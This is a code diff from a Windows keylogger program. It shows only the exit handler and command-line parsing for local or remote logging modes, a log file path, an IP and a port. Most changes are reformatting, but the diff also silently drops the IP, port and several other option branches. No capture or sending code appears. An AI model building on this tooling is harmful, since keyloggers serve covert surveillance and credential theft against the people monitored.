@@ -14,7 +14,7 @@ BOOL exit_program(DWORD signal)
 {
 	delete g_keylogger;
 
-	exit(EXIT_FAILURE);
+	exit (EXIT_FAILURE);
 }
 
 void initialize_options(int argc, char** argv)
@@ -22,104 +22,70 @@ void initialize_options(int argc, char** argv)
 	int t_result_option = 0;
 	int t_option_index = 0;
 
-	struct option t_long_options[] = {
-		{
-			LONG_OPTION_LOCAL, no_argument, NULL, SHORT_OPTION_LOCAL }, {
-			LONG_OPTION_FILE_PATH, required_argument, NULL, SHORT_OPTION_FILE_PATH }, {
-			LONG_OPTION_REMOTE, no_argument, NULL, SHORT_OPTION_REMOTE }, {
-			LONG_OPTION_FILE_PATH, required_argument, NULL, SHORT_OPTION_FILE_PATH }, {
-			LONG_OPTION_FILE_PATH, required_argument, NULL, SHORT_OPTION_FILE_PATH }, {
-			LONG_OPTION_NO_ARROW, no_argument, NULL, SHORT_OPTION_NO_ARROW }, {
-			LONG_OPTION_NO_CLICK, no_argument, NULL, SHORT_OPTION_NO_CLICK }, {
-			LONG_OPTION_ASCII_ONLY, no_argument, NULL, SHORT_OPTION_ASCII_ONLY }, {
-			LONG_OPTION_MAXIMUM_BUFFER_SIZE, required_argument, NULL, SHORT_OPTION_MAXIMUM_BUFFER_SIZE }, {
-			LONG_OPTION_HELP, no_argument, NULL, SHORT_OPTION_HELP }, {
-			NULL, 0, NULL, 0 } };
+	struct option t_long_options[] =
+	{
+	{
+	LONG_OPTION_LOCAL, no_argument, NULL, SHORT_OPTION_LOCAL },
+	{
+	LONG_OPTION_FILE_PATH, required_argument, NULL, SHORT_OPTION_FILE_PATH },
+	{
+	LONG_OPTION_REMOTE, no_argument, NULL, SHORT_OPTION_REMOTE },
+	{
+	LONG_OPTION_FILE_PATH, required_argument, NULL, SHORT_OPTION_FILE_PATH },
+	{
+	LONG_OPTION_FILE_PATH, required_argument, NULL, SHORT_OPTION_FILE_PATH },
+	{
+	LONG_OPTION_NO_ARROW, no_argument, NULL, SHORT_OPTION_NO_ARROW },
+	{
+	LONG_OPTION_NO_CLICK, no_argument, NULL, SHORT_OPTION_NO_CLICK },
+	{
+	LONG_OPTION_ASCII_ONLY, no_argument, NULL, SHORT_OPTION_ASCII_ONLY },
+	{
+	LONG_OPTION_MAXIMUM_BUFFER_SIZE, required_argument, NULL,
+	SHORT_OPTION_MAXIMUM_BUFFER_SIZE },
+	{
+	LONG_OPTION_HELP, no_argument, NULL, SHORT_OPTION_HELP },
+	{ NULL, 0, NULL, 0 } };
 
-	while((t_result_option = getopt_long(argc, argv, "lf:ri:p:acAm:h", t_long_options, &t_option_index)) != -1)
+	while ((t_result_option = getopt_long(argc, argv, "lf:ri:p:acAm:h", t_long_options, &t_option_index))
+	    != -1)
 	{
 		switch (t_result_option)
 		{
-		case 0:
-			if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_LOCAL) == 0)
-			{
-				if (g_keylogger != nullptr)
-					delete g_keylogger;
-
-				g_keylogger = new keylogger_local();
-
-				g_keylogger_local = true;
-				g_keylogger_remote = false;
-			}
-			else
-				if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_FILE_PATH) == 0)
+			case 0:
+				if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_LOCAL)
+				    == 0)
 				{
-					cout << "file path" << endl;
+					if (g_keylogger != nullptr)
+						delete g_keylogger;
 
-					g_file_path->clear();
+					g_keylogger = new keylogger_local();
 
-					g_file_path->append(optarg);
+					g_keylogger_local = true;
+					g_keylogger_remote = false;
 				}
 				else
-					if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_REMOTE) == 0)
+					if (strcasecmp(t_long_options[t_option_index].name,
+					LONG_OPTION_FILE_PATH) == 0)
 					{
-						if (g_keylogger != nullptr)
-							delete g_keylogger;
+						cout << "file path" << endl;
 
-						g_keylogger = new keylogger_remote();
+						g_file_path->clear();
 
-						g_keylogger_local = false;
-						g_keylogger_remote = true;
+						g_file_path->append(optarg);
 					}
 					else
-						if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_IP) == 0)
+						if (strcasecmp(t_long_options[t_option_index].name,
+						LONG_OPTION_REMOTE) == 0)
 						{
-							g_ip->clear();
+							if (g_keylogger != nullptr)
+								delete g_keylogger;
 
-							g_ip->append(optarg);
+							g_keylogger = new keylogger_remote();
+
+							g_keylogger_local = false;
+							g_keylogger_remote = true;
 						}
-						else
-							if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_PORT) == 0)
-							{
-								g_port = atoi(optarg);
-							}
-							else
-								if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_NO_ARROW) == 0)
-								{
-									//TODO
-								}
-								else
-									if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_NO_CLICK) == 0)
-									{
-										//TODO
-									}
-									else
-										if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_ASCII_ONLY) == 0)
-										{
-											//TODO
-										}
-										else
-											if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_ASCII_ONLY) == 0)
-											{
-												//TODO
-											}
-											else
-												if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_HELP) == 0)
-												{
-													//TODO
-												}
-												else
-													//TODO
-													return;
-			break;
-
-		case SHORT_OPTION_FILE_PATH:
-			cout << "file path" << endl;
-
-			g_file_path->clear();
-
-			g_file_path->append(optarg);
-			break;
 		}
 	}
 }
